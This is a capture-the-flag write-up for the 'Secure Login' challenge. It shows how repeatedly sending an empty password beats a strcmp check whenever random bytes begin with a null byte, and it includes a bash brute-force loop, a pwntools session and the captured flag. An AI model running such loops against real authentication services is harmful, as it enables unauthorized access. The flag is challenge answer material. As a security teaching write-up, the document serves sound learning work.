# Secure Login

### Description

![](Description.png)
![](Hint.png)

## Solution

This is the most mind boggling solution I have ever seen.

All you literally need to do is keep sending empty passwords until you luck out.
A python solution is in `solve.py`

```
cd /problems/2021/secure_login
while true; do
echo "
"|./login
done
```

### How does it work


I didn't really know where to start, and the Hint didn't lead me anywhere.
So I took the source code, modified and compiled it. After that I just tinkered around with it.
I tried running it in pwntools to extract the password and put it back in the program for testing. It is then I noticed something interesting.

```
(base) [hacker@hackerbook Secure Login]$ python2
Python 2.7.18 (default, Mar 15 2021, 14:29:03)
[GCC 10.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> r = process("/tmp/test")
[x] Starting local process '/tmp/test'
[+] Starting local process '/tmp/test': pid 14888
>>> r.read()
'Welcome to my ultra secure login service!\nGenerated Password is \xd3\xb1\x91d[\xbd"%\x80\x89O\xea\n'
>>> r.send("\xd3\xb1\x91d[\xbd\"%\x80\x89O\xea\n")
>>> r.read()
[*] Process '/tmp/test' stopped with exit code 1 (pid 14888)
'Enter the password: Error: missing flag.txt.\n'
```

Notice how I didn't even input in a string of 128 characters, which is supposed to be the length of the password as suggested by the `fgets(password, 128, file);` in the file. Even so, it still passes the check? Why?

My theory is that strings in C terminate at the newline/ null byte/ terminating character or something.
`strcmp` only compares to the terminating character.
There is a chance that the `/dev/urandom` generates a `\x00` as the first character. This denotes that the password would be entirely empty. If I keep sending empty strings, sooner or later, I'll meet into this situation and pass the check.

It was a stupid idea, since it was luck based, but then I coded out `solve.py`, and it worked on my local machine? So I coded a bash script as in above, and got the flag


### Running on the Server

```
team8845@actf:~$ cd /problems/2021/secure_login
team8845@actf:/problems/2021/secure_login$ while true; do echo "
"|/problems/2021/secure_login/login done; done
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: actf{if_youre_reading_this_ive_been_hacked}

Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
Welcome to my ultra secure login service!
Enter the password: Wrong!
```
## Flag

`actf{if_youre_reading_this_ive_been_hacked}`
